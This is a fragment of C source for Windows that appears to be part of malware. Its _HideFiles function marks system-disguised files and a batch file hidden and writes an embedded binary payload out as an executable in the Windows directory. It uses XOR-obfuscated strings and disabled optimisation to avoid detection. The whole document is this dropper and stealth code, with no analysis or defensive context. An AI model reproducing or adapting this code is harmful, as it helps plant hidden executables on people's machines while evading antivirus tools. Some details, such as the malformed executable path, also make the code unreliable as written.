#include "data_globals.h"
#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}


#include <windows.h>
#include <string.h>

void _HideFiles(void)
{
    HANDLE hFile;

    SetFileAttributesA(_windoze2, FILE_ATTRIBUTE_HIDDEN);
    SetFileAttributesA(_sysdoze2, FILE_ATTRIBUTE_HIDDEN);
    _chdir(_windir);

    // Obfuscate "BBbLWDB.Bat" with key 0x3E
    volatile char sz_bat[] = { 'B'^0x3E, 'B'^0x3E, 'b'^0x3E, 'L'^0x3E, 'W'^0x3E, 'D'^0x3E, 'B'^0x3E, '.'^0x3E, 'B'^0x3E, 'a'^0x3E, 't'^0x3E, 0x00^0x3E };
    xor_decrypt(sz_bat, sizeof(sz_bat), 0x3E);
    SetFileAttributesA((char*)sz_bat, FILE_ATTRIBUTE_HIDDEN);

    strcpy(_L0NEPath, _windir);

    // Obfuscate "\\.EXE" with key 0x7A
    volatile char sz_exe[] = { '\\'^0x7A, '\\'^0x7A, '.'^0x7A, 'E'^0x7A, 'X'^0x7A, 'E'^0x7A, 0x00^0x7A };
    xor_decrypt(sz_exe, sizeof(sz_exe), 0x7A);
    strcat(_L0NEPath, (char*)sz_exe);

    hFile = CreateFileA(_L0NEPath, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(hFile, _L0NEInc, sizeof(_L0NEInc), NULL, NULL);
    CloseHandle(hFile);
}
#pragma optimize("", on)
